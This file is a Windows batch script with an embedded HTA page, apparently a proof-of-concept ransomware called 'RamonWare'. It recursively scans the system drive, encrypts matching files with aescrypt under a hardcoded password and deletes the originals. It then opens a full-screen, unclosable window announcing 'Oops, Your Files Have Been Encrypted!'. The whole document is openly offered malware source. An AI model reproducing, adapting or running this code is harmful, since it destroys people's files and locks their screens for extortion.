<!-- :: Seccion de Batch
@Echo OFF
mode con:cols=50 lines=2
set pass=SegoCode

Title Ramon Ware

echo Scanning. . . .

FOR /R "%homedrive%\" %%X in (*.estoesuntest) DO (
REM echo %%X >> %homedrive%\Original.txt
Rename "%%X" "%%~nX.crypt" >NUL 2>&1
aescrypt -e -p %pass% "%%X"
del "%%X"
)



REM Block Screen
cls
setlocal
for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"

-->

<html>
    <head>
        <title>CryptMSG</title>
    <hta:application id="oBVC" 
                     applicationname="BSOD"  
                     version="1.0" 
                     maximizebutton="no" 
                     minimizebutton="no" 
                     sysmenu="no" 
                     Caption="no" 
                     windowstate="maximize"/> 
    <style>
        #texto2{
            padding-top: 19%;
            letter-spacing: 1px;
            text-align: center;
        }
    </style>
</head>
<body bgcolor="#8c1d1d" scroll="no">
    <font face="Lucida Console" size="4" color="white">
<center><p> - RamonWare Crypt - </p></center>
<div id="texto2">
    Oops, Your Files Have Been Encrypted!<br>
    <br><br>
    Now you need run RamonDecryptor, be careful next time<br>
    <br><br>
   Github.com/SegoCode<br>
    <br><br><br>
    <img id="imagen" alt="Candado" src="https://i.imgur.com/rytGPFG.png" height="130" width="100">
</div>
</body>
</html>
